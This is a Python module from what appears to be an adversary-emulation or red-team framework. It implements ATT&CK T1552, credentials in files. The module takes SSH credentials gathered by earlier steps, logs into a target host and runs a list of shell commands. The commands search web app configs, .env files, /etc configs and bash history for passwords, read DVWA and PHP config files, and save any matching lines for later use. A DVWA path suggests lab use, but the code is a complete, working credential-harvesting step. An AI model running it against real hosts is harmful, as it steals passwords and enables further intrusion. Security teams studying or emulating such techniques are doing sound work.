"""
techniques/credential_access/creds_in_files.py
ATT&CK: T1552 — Unsecured Credentials: Credentials in Files
Tactic:  Credential Access

Over an established SSH session, searches common filesystem locations
for plaintext credentials — .env files, config files, shell history,
database config, web app configs. Requires a prior SSHPivot to have
put SSH client access into Context.
"""

import paramiko
from typing import Any

from core.context import Context
from core.technique import Tactic, Technique

SEARCH_COMMANDS = [
    "find /var/www -name '*.php' | xargs grep -l 'password\\|passwd\\|db_pass' 2>/dev/null | head -5",
    "find /home /root -name '.env' -o -name '*.env' 2>/dev/null | head -5",
    "find /etc -name '*.conf' | xargs grep -l 'password' 2>/dev/null | head -5",
    "cat /var/www/html/config.php 2>/dev/null || echo NOT_FOUND",
    "cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null || echo NOT_FOUND",
    "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|mysql\\|ssh' | head -10",
    "grep -r 'DB_PASSWORD\\|db_password\\|MYSQL_PASS' /var/www 2>/dev/null | head -10",
]


class CredsInFiles(Technique):
    name = "creds-in-files"
    attack_id = "T1552"
    tactic = Tactic.CREDENTIAL_ACCESS

    def __init__(
        self,
        target: str,
        port: int = 22,
        username: str | None = None,
        password: str | None = None,
        timeout: float = 10.0,
    ):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.timeout = timeout

    def _resolve_creds(self, context: Context) -> tuple[str | None, str | None]:
        if self.username and self.password:
            return self.username, self.password
        creds = context.credentials_valid_on(self.target) or context.credentials
        if creds:
            return creds[0].username, creds[0].password
        return None, None

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        username, password = self._resolve_creds(context)
        if not username or not password:
            return False, "No SSH credentials in Context for CredsInFiles", {}

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                self.target, port=self.port, username=username, password=password,
                timeout=self.timeout, look_for_keys=False, allow_agent=False,
            )
        except Exception as exc:
            return False, f"SSH connection failed: {exc}", {}

        findings: list[dict] = []
        try:
            for cmd in SEARCH_COMMANDS:
                _, stdout, _ = client.exec_command(cmd)
                output = stdout.read().decode("utf-8", errors="replace").strip()
                if output and "NOT_FOUND" not in output:
                    findings.append({"command": cmd, "output": output[:500]})
        finally:
            client.close()

        if findings:
            for f in findings:
                # Surface obvious credential patterns into Context
                for line in f["output"].splitlines():
                    if any(k in line.lower() for k in ["password", "passwd", "db_pass"]):
                        context.extra.setdefault("file_creds", []).append(line.strip())

        summary = (
            f"Found {len(findings)} credential-bearing file(s)/location(s) on {self.target}"
            if findings
            else f"No plaintext credentials found in common locations on {self.target}"
        )
        return bool(findings), summary, {
            "target": self.target,
            "findings": findings,
        }
